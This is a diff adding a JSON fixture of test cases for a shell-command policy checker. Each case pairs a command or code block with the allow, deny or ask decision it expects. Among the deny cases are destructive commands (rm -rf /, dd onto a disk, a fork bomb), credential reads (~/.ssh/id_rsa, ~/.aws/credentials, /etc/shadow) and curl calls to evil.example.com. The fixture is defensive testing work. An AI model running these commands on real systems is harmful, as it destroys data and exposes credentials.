@@ -1,0 +1,211 @@
+[
+  {
+    "name": "safe_list_directory",
+    "command": "ls -la",
+    "executor_type": "local",
+    "expect_decision": "allow",
+    "expect_rule_id": ""
+  },
+  {
+    "name": "safe_git_status",
+    "command": "git status",
+    "executor_type": "local",
+    "expect_decision": "allow",
+    "expect_rule_id": ""
+  },
+  {
+    "name": "safe_go_test",
+    "command": "go test ./...",
+    "executor_type": "local",
+    "expect_decision": "allow",
+    "expect_rule_id": ""
+  },
+  {
+    "name": "safe_cat_readme",
+    "command": "cat README.md",
+    "executor_type": "local",
+    "expect_decision": "allow",
+    "expect_rule_id": ""
+  },
+  {
+    "name": "safe_pipe_grep",
+    "command": "cat data.txt | grep foo",
+    "executor_type": "local",
+    "expect_decision": "allow",
+    "expect_rule_id": ""
+  },
+  {
+    "name": "dangerous_rm_root",
+    "command": "rm -rf /",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "danger_cmd_001"
+  },
+  {
+    "name": "dangerous_dd_disk",
+    "command": "dd if=/dev/zero of=/dev/sda",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "danger_cmd_001"
+  },
+  {
+    "name": "dangerous_shutdown",
+    "command": "shutdown -h now",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "danger_cmd_001"
+  },
+  {
+    "name": "dangerous_chmod_root",
+    "command": "chmod 777 /",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "danger_cmd_001"
+  },
+  {
+    "name": "read_ssh_key",
+    "command": "cat ~/.ssh/id_rsa",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "danger_cmd_001"
+  },
+  {
+    "name": "read_aws_credentials",
+    "command": "cat ~/.aws/credentials",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "danger_cmd_001"
+  },
+  {
+    "name": "read_etc_shadow",
+    "command": "cat /etc/shadow",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "danger_cmd_001"
+  },
+  {
+    "name": "network_curl_unknown",
+    "command": "curl http://evil.example.com/x",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "network_002"
+  },
+  {
+    "name": "network_curl_github_ask",
+    "command": "curl https://github.com/foo/bar",
+    "executor_type": "local",
+    "expect_decision": "ask",
+    "expect_rule_id": "network_002",
+    "allowed_domains": ["github.com"]
+  },
+  {
+    "name": "network_git_clone_github_ask",
+    "command": "git clone https://github.com/foo/bar",
+    "executor_type": "local",
+    "expect_decision": "ask",
+    "expect_rule_id": "network_002",
+    "allowed_domains": ["github.com"]
+  },
+  {
+    "name": "shell_bypass_sh_c",
+    "command": "sh -c 'echo hello'",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "shell_bypass_003"
+  },
+  {
+    "name": "shell_bypass_eval",
+    "command": "eval dangerous_var",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "shell_bypass_003"
+  },
+  {
+    "name": "install_apt_local_pkg",
+    "command": "apt-get install --no-download nginx",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "install_004"
+  },
+  {
+    "name": "install_apt_local",
+    "command": "apt-get install nginx",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "install_004"
+  },
+  {
+    "name": "hostexec_setuid",
+    "command": "setuid",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "hostexec_005"
+  },
+  {
+    "name": "resource_while_true",
+    "command": "while true; do echo x; done",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "resource_006"
+  },
+  {
+    "name": "resource_fork_bomb",
+    "command": ":(){ :|:& };:",
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "resource_006"
+  },
+  {
+    "name": "ask_git_push",
+    "command": "git push origin main",
+    "executor_type": "local",
+    "expect_decision": "ask",
+    "expect_rule_id": "ask_review_008"
+  },
+  {
+    "name": "ask_docker_push",
+    "command": "docker push myrepo/app:latest",
+    "executor_type": "local",
+    "expect_decision": "ask",
+    "expect_rule_id": "ask_review_008"
+  },
+  {
+    "name": "ask_rm_recursive",
+    "command": "rm -r ./build",
+    "executor_type": "local",
+    "expect_decision": "ask",
+    "expect_rule_id": "ask_review_008"
+  },
+  {
+    "name": "codeblock_python_curl",
+    "code_blocks": [
+      {"language": "python", "code": "import os\nos.system('curl http://evil.example.com')\n"}
+    ],
+    "executor_type": "local",
+    "expect_decision": "deny",
+    "expect_rule_id": "network_002"
+  },
+  {
+    "name": "codeblock_python_safe",
+    "code_blocks": [
+      {"language": "python", "code": "import math\nprint(math.sqrt(16))\n"}
+    ],
+    "executor_type": "local",
+    "expect_decision": "allow",
+    "expect_rule_id": ""
+  },
+  {
+    "name": "container_executor_chmod",
+    "command": "chmod 777 /etc/passwd",
+    "executor_type": "container",
+    "expect_decision": "deny",
+    "expect_rule_id": "danger_cmd_001"
+  },
+  {
+    "name": "container_executor_safe",
+    "command": "ls -la /workspace",
+    "executor_type": "container",
+    "expect_decision": "allow",
+    "expect_rule_id": ""
+  }
+]
